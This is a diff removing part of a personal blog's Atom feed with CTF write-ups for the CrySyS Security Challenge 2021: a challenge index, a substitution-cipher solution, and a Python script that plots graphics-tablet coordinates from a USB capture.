@@ -1,523 +1,1016 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://m4rcix.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://m4rcix.github.io/" rel="alternate" type="text/html" /><updated>2021-03-18T09:39:27+00:00</updated><id>https://m4rcix.github.io/feed.xml</id><title type="html">m4rcix</title><subtitle>*in my best possible Obi-Wan Kenobi impression* Hello there! My name is Marci(x) and my intrests are, to name a few: cybersecurity, videogames, speedrunning. In this blog I will mostly write about my studies, CTFs I attended, challenges I solved, and probably anything else I feel like writing about. If you want, feel free to check out my socials, if you wanna contact me, feel free to do so on Discord, Twitter, etc. Happy reading! :)
-</subtitle><author><name>m4rcix</name></author><entry><title type="html">CrySyS Security Challenge 2021</title><link href="https://m4rcix.github.io/SecChall21" rel="alternate" type="text/html" title="CrySyS Security Challenge 2021" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/secchall21</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21">&lt;p&gt; &lt;/p&gt;
-
-&lt;p&gt;This blogpost contains my writeups for the CrySyS Security Challenge 2021!&lt;/p&gt;
-
-&lt;p&gt;Flags are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HIDDEN&lt;/code&gt; until the end of the semester due to University reasons.&lt;/p&gt;
-
-&lt;p&gt;The tables below contain my solution for some of the challenges. I did not managed to solve a lot, but plan on solving some more until they are available. The Solved column indicates the challenges I managed to solve during the challenge period.&lt;/p&gt;
-
-&lt;h2 id=&quot;crypto&quot;&gt;Crypto&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Challenge&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;Solved&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/crypto/mono_madmax&quot;&gt;Monoalphabetic MadMax&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Stateless&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Prerecorded&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Variable length mtp&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Oracle&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;pwn&quot;&gt;Pwn&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Challenge&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;Solved&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/pwn/c0pydump&quot;&gt;c0pydump&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guidance to Salvation&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;KUVID21&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Roguelike&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Conundrum at El Nit Patroon Rico&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;reverse&quot;&gt;Reverse&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Challenge&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;Solved&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/reverse/serial&quot;&gt;SerialHacker&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;:)&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Xenia Laurencia Maria&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Celestial Yarr Harr Harr&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;JuniorPK&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;web&quot;&gt;Web&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Challenge&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;Solved&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/web/sqplosion&quot;&gt;SQpLosIon&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/web/manual&quot;&gt;Manual for the apocalypse&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/web/unTILDEend&quot;&gt;Until the end&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/web/poison&quot;&gt;Poison for tomorrow&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Jinja ninja&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;hardware&quot;&gt;Hardware&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Challenge&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;Solved&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/hardware/escape&quot;&gt;Escape the chains&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/hardware/gates_of_valhalla&quot;&gt;The gates of Valhalla&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/hardware/safe&quot;&gt;A safe place&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/hardware/crystal&quot;&gt;Crystal from the past&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;SPIcy information&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;misc&quot;&gt;Misc&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Challenge&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;Solved&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/misc/weeb&quot;&gt;キーボード・レイアウト&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/misc/iusearchbtw&quot;&gt;I use arch btw&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/misc/little_mix&quot;&gt;Little Mix&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/SecChall21/misc/TBD&quot;&gt;TBD&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;✅&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Lost &amp;amp; Found&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;❌&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;</content><author><name>m4rcix</name></author><category term="secchallenge" /><category term="crysys" /><category term="CTF" /><category term="pwn" /><category term="crypto" /><category term="web" /><category term="hardware" /><category term="misc" /><category term="reverse" /><summary type="html"> </summary></entry><entry><title type="html">Monoalphabetic MadMax</title><link href="https://m4rcix.github.io/SecChall21/crypto/mono_madmax" rel="alternate" type="text/html" title="Monoalphabetic MadMax" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/crypto/mono_madmax</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/crypto/mono_madmax">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;You love it, you hate it, it doesn’t matter this is monoalphabetic.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: Suma&lt;/li&gt;
-  &lt;li&gt;Difficulty: easy&lt;/li&gt;
-  &lt;li&gt;Attachment: &lt;a href=&quot;/media/SecChall21/Crypto/Mono/enc.txt&quot;&gt;enc.txt&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;p&gt;Just reading the title of the challenge, it was clear we are facing a monoalphabetic substitution cipher. A quick google search led me to this &lt;a href=&quot;https://www.dcode.fr/monoalphabetic-substitution&quot;&gt;site&lt;/a&gt;. Pasting the text and decoding it, gives us readable information: the script of Mad Max 2: The Road Warrior. One “feature”, this site has, is it only gives a fixed number of characters as output, so I had to move the flag from the middle of the file to the top. (It was easy to find, thanks to the curly brackets)&lt;/p&gt;
-
-&lt;p&gt;The acquired flag is:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><category term="crypto" /><category term="secchallenge" /><summary type="html">Description</summary></entry><entry><title type="html">Crystal from the past</title><link href="https://m4rcix.github.io/SecChall21/hardware/crystal" rel="alternate" type="text/html" title="Crystal from the past" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/hardware/crystal</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/hardware/crystal">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- Hey, Nux! Look at this crystal! It's almost as nice as a V8 engine!
-- What?
-- It looks like... a chrome... thingy.
-- What are you talking about. Let me see.
-- NO! ITS MINE! I... MUST... DRAW!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;One of Nux’s weirdo friend found a mesmerizing crystal in the desert. After taking it with him, he got posessed with it. He tells weird jokes no one understands, and draws a lot on his shitty computer using an unrecognizeable graphic tablet as old as mankind. However, he won’t let you see the drawings, thus, you installed a packet sniffer on his computer.&lt;/p&gt;
-
-&lt;p&gt;You managed to get a pcap of one of his drawing. He starts every session by calibrating the graphic tablet. This is achieved by drawing a horizontal and a vertical line, pushing the tip of the pen (draw force calibration), and tilting the pen around.&lt;/p&gt;
-
-&lt;p&gt;Your task is to recover the picture he drew.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: Csf3r3ncz1&lt;/li&gt;
-  &lt;li&gt;Difficulty: medium&lt;/li&gt;
-  &lt;li&gt;Attachments: &lt;a href=&quot;/media/SecChall21/Hardware/Crystal/calibration.pcap&quot;&gt;calibration.pcap&lt;/a&gt;, &lt;a href=&quot;/media/SecChall21/Hardware/Crystal/challenge.pcap&quot;&gt;challenge.pcap&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;p&gt;I started this challenge with looking at the given &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calibration.pcap&lt;/code&gt; file inside Wireshark. I noticed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;USB descriptor&lt;/code&gt; but since google didn’t gave me an understandable protocol description easily, I tried to understand the sent bytes in a logical manner. We knew the following from the description:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Our guy starts with a horizontal line&lt;/li&gt;
-  &lt;li&gt;Followed by a vertical line&lt;/li&gt;
-  &lt;li&gt;Then some other calibration stuff&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;This meant to me, I am looking for an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt; variable sent, signaling the pen’s position, and some other stuff, which might be handy later, e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;force&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tilt&lt;/code&gt;. I exported the captured data from Wireshark, and started working. (Yes I knew about PyShark, but I couldn’t make it to work, since it failed to load the data from me from the packets.) This is the script I came up with, which loads the data, and then plots it to a diagram.&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/bin/env python3
-&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;numpy&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;matplotlib.pyplot&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./calibration.data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#file = open('./chall.data', 'r')
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;#Read data from capture
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'02'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-			&lt;span class=&quot;s&quot;&gt;'idk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-			&lt;span class=&quot;s&quot;&gt;'x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-			&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-			&lt;span class=&quot;s&quot;&gt;'force'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-			&lt;span class=&quot;s&quot;&gt;'tilt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;#Plot the data
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scatter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/media/SecChall21/Hardware/Crystal/calibration.png&quot; alt=&quot;calibration.png&quot; /&gt;&lt;/p&gt;
-
